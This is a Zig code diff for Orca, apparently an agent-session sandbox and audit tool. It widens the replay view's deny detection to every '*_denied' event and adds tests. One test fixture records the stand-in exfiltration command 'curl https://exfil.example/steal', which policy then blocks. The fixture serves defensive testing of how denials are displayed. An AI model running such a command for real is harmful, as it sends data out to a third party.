@@ -112,8 +112,10 @@ fn replaySession(
     return exit_codes.success;
 }
 
-fn isDeniedEventType(event_type: []const u8) bool {
-    return std.mem.eql(u8, event_type, "command_denied");
+/// Deny emphasis for human/TUI replay: mirrors audit `only_denied` semantics
+/// (`*_denied` type suffix and/or decision result `deny`).
+fn isDeniedEvent(event: core_api.ReplayEvent) bool {
+    return event.isDenied();
 }
 
 const ReplayTimelineRow = struct {
@@ -140,7 +142,7 @@ fn writeReplayHuman(
     // Dominant summary when denials are present (demo gold: bare `orca replay`).
     var denied_count: usize = 0;
     for (session.events) |event| {
-        if (isDeniedEventType(event.event_type)) denied_count += 1;
+        if (isDeniedEvent(event)) denied_count += 1;
     }
     if (denied_count > 0) {
         var deny_body: std.ArrayList(u8) = .empty;
@@ -148,7 +150,7 @@ fn writeReplayHuman(
         try deny_body.print(allocator, "{d} action(s) blocked:", .{denied_count});
         var listed: usize = 0;
         for (session.events) |event| {
-            if (!isDeniedEventType(event.event_type)) continue;
+            if (!isDeniedEvent(event)) continue;
             if (listed == 0) {
                 try deny_body.print(allocator, " {s}", .{event.target_value});
             } else {
@@ -198,7 +200,7 @@ fn writeReplayHuman(
         rows[timeline_len] = .{
             .icon = replayEventIcon(event.event_type),
             .detail = detail,
-            .denied = isDeniedEventType(event.event_type),
+            .denied = isDeniedEvent(event),
         };
         timeline_len += 1;
         event_index += group_len;
@@ -237,8 +239,8 @@ fn writeReplayTimeline(io: std.Io, stdout: anytype, rows: []const ReplayTimeline
 }
 
 fn replayEventIcon(event_type: []const u8) []const u8 {
-    if (std.mem.eql(u8, event_type, "command_allowed")) return "✓";
-    if (std.mem.eql(u8, event_type, "command_denied")) return "✗";
+    if (std.mem.endsWith(u8, event_type, "_allowed")) return "✓";
+    if (std.mem.endsWith(u8, event_type, "_denied")) return "✗";
     if (std.mem.eql(u8, event_type, "secret_redacted")) return "⚠";
     if (std.mem.startsWith(u8, event_type, "session_")) return "ℹ";
     return "•";
@@ -277,7 +279,7 @@ fn buildTimelineLinesForTui(allocator: std.mem.Allocator, session: core_api.Repl
             }
         }
         const icon = replayEventIcon(event.event_type);
-        const denied = isDeniedEventType(event.event_type);
+        const denied = isDeniedEvent(event);
         const line = if (group_len > 1)
             try std.fmt.allocPrint(allocator, "{s}  {s} · {s} · {d} secret redactions · {s}", .{
                 icon, event.timestamp, event.event_type, group_len, event.target_value,
@@ -544,6 +546,53 @@ test "replay human timeline emphasizes denied actions" {
     try std.testing.expect(std.mem.indexOf(u8, output, "command_denied") != null);
 }
 
+test "replay human timeline emphasizes network_connect_denied without command_denied" {
+    // M-4: deny classifier must treat *_denied event types (not only command_denied).
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
+    defer std.testing.allocator.free(root);
+    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    {
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        defer policy_file.close(std.testing.io);
+        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
+    }
+    const session_id = try writeReplayNetworkDenyFixture(std.testing.io, std.testing.allocator, root);
+    defer std.testing.allocator.free(session_id);
+
+    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
+    defer std.testing.allocator.free(previous_cwd);
+    try std.process.setCurrentDir(std.testing.io, tmp.dir);
+    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};
+
+    var stdout_buf: [4096]u8 = undefined;
+    var stderr_buf: [512]u8 = undefined;
+    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
+    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);
+
+    const code = try command(std.testing.io, &.{}, &stdout_writer, &stderr_writer);
+    try std.testing.expectEqual(exit_codes.success, code);
+    try std.testing.expectEqualStrings("", stderr_writer.buffered());
+    const output = stdout_writer.buffered();
+    // No command_denied in this fixture — DENY badge/callout must still appear.
+    try std.testing.expect(std.mem.indexOf(u8, output, "command_denied") == null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "network_connect_denied") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "Denied") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "[DENY]") != null or std.mem.indexOf(u8, output, "DENY") != null);
+    try std.testing.expect(std.mem.indexOf(u8, output, "https://exfil.example/steal") != null);
+}
+
+test "isDeniedFields mirrors audit only_denied semantics" {
+    try std.testing.expect(core_api.isDeniedFields("command_denied", null));
+    try std.testing.expect(core_api.isDeniedFields("network_connect_denied", null));
+    try std.testing.expect(core_api.isDeniedFields("file_write_denied", null));
+    try std.testing.expect(core_api.isDeniedFields("command_allowed", "deny"));
+    try std.testing.expect(!core_api.isDeniedFields("command_allowed", "allow"));
+    try std.testing.expect(!core_api.isDeniedFields("command_allowed", null));
+    try std.testing.expect(!core_api.isDeniedFields("secret_redacted", null));
+}
+
 fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
     const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
     var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
@@ -596,6 +645,66 @@ fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspac
     try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
         .session = session,
         .status = .{ .exited = 0 },
+        .event_count = audit_writer.event_count,
+        .final_event_hash = audit_writer.finalHash() orelse "",
+        .policy = ".orca/policy.yaml",
+        .product_label = "Orca",
+    });
+    return allocator.dupe(u8, audit_writer.session_id.slice());
+}
+
+/// Session fixture with network_connect_denied only (no command_denied) for M-4 classifier.
+fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
+    const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
+    var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
+    const session_id_text = try std.fmt.bufPrint(&session_id.value, "replay-network-deny-fixture", .{});
+    session_id.len = session_id_text.len;
+    const session = core.session.Session{
+        .id = session_id,
+        .started_at = now,
+        .ended_at = now,
+        .command = "orca",
+        .args = &.{ "run", "--", "curl", "https://exfil.example/steal" },
+        .workspace_root = workspace_root,
+        .session_name = "replay-network-deny-test",
+        .mode = .strict,
+        .platform = core.platform.detectOs(),
+    };
+    var audit_writer = try core_api.createAuditWriter(io, allocator, session);
+    defer audit_writer.deinit();
+
+    var allowed_id: core.event.EventId = .{ .value = undefined, .len = 0 };
+    const allowed_id_text = try std.fmt.bufPrint(&allowed_id.value, "allowed", .{});
+    allowed_id.len = allowed_id_text.len;
+    const allowed = try core_api.createAuditEvent(.{
+        .session_id = session.id,
+        .event_id = allowed_id,
+        .timestamp = now,
+        .event_type = .command_allowed,
+        .actor = .{ .kind = .orca, .display = "orca" },
+        .target = .{ .kind = .command, .value = "curl https://exfil.example/steal" },
+        .decision = core_api.makeDecision(.{ .result = .allow, .reason = "command allowed" }),
+    });
+    try core_api.appendAuditEvent(&audit_writer, allowed);
+
+    var denied_id: core.event.EventId = .{ .value = undefined, .len = 0 };
+    const denied_id_text = try std.fmt.bufPrint(&denied_id.value, "net-denied", .{});
+    denied_id.len = denied_id_text.len;
+    const denied = try core_api.createAuditEvent(.{
+        .session_id = session.id,
+        .event_id = denied_id,
+        .timestamp = now,
+        .event_type = .network_connect_denied,
+        .actor = .{ .kind = .orca, .display = "orca" },
+        .target = .{ .kind = .network_endpoint, .value = "https://exfil.example/steal" },
+        .decision = core_api.makeDecision(.{ .result = .deny, .reason = "network blocked by policy" }),
+    });
+    try core_api.appendAuditEvent(&audit_writer, denied);
+
+    try audit_writer.writeLastPointer();
+    try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
+        .session = session,
+        .status = .{ .exited = 1 },
         .event_count = audit_writer.event_count,
         .final_event_hash = audit_writer.finalHash() orelse "",
         .policy = ".orca/policy.yaml",
